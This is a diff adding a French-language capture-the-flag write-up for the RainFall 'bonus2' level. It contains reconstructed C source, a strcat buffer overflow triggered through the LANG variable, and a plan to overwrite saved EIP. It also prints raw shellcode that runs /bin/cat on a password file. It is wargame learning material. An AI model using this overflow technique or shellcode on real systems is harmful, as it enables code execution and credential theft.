@@ -1,0 +1,80 @@
+bonus2@RainFall:~$ ./bonus2
+bonus2@RainFall:~$ ./bonus2 hey
+bonus2@RainFall:~$ ./bonus2 1
+bonus2@RainFall:~$ ./bonus2 1 2 3
+bonus2@RainFall:~$ ./bonus2 1 2
+Hello 1
+bonus2@RainFall:~$ ./bonus2 ETHA 2
+Hello ETHA
+bonus2@RainFall:~$ ./bonus2 ETHA 1
+Hello ETHA
+bonus2@RainFall:~$ ./bonus2 ETHA brt
+Hello ETHA
+bonus2@RainFall:~$
+
+int language = 0;   // global .bss @ 0x8049988
+
+void greetuser(char user_data[76])
+{
+    char greeting[72] = {0};         // ebp-0x48
+
+    if (language == 1)
+        memcpy(greeting, "Hyv\xc3\xa4\xc3\xa4 p\xc3\xa4iv\xc3\xa4\xc3\xa4 ", 19);
+    else if (language == 2)
+        memcpy(greeting, "Goedemiddag! ", 14);
+    else if (language == 0)
+        memcpy(greeting, "Hello ", 7);
+
+    strcat(greeting, user_data);
+    puts(greeting);
+}
+
+int main(int argc, char **argv)
+{
+    char  buf[76];      // esp+0x50, mis à zéro via rep stos (19 dwords)
+    char *lang_env;     // esp+0x9C
+
+    if (argc != 3)
+        return 1;
+
+    memset(buf, 0, 76);
+
+    strncpy(buf,        argv[1], 0x28);  // 40 octets -> buf[0..39]
+    strncpy(buf + 0x28, argv[2], 0x20);  // 32 octets -> buf[40..71]
+
+    lang_env = getenv("LANG");
+    if (lang_env != NULL)
+    {
+        if (memcmp(lang_env, "fi", 2) == 0)
+            language = 1;
+        else if (memcmp(lang_env, "nl", 2) == 0)
+            language = 2;
+    }
+
+    greetuser(buf);
+    return 0;
+}
+
+on peut remarquer que user_data qui fait 76o est placer dans greeting qui fait 72o par 
+	strcat(greeting, user_data); donc potentiel buffer overflow.
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+
+bonus2@RainFall:~$ env | grep LANG
+LANG=fi
+bonus2@RainFall:~$ ./bonus2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+Hyvää päivää aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+Segmentation fault (core dumped)
+bonus2@RainFall:~$
+
+Donc overflow possible et j'ai 72o dispo pour mon payload
+
+Que faire avec cet overflow ?
+Ecraser eip avec l'adresse du buffer (greeting) qui contient notre shellcode
+Le shellcode fait 62o en general auquels il faut ajouter les 4o de l'addr.
+
+\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x70\x61\x73\x73\x68\x33\x2f\x2f\x2e\x68\x6f\x6e\x75\x73\x68\x65\x72\x2f\x62\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80
+
+debut de greeting ebp-0x48
+offset pour overide saved eip.
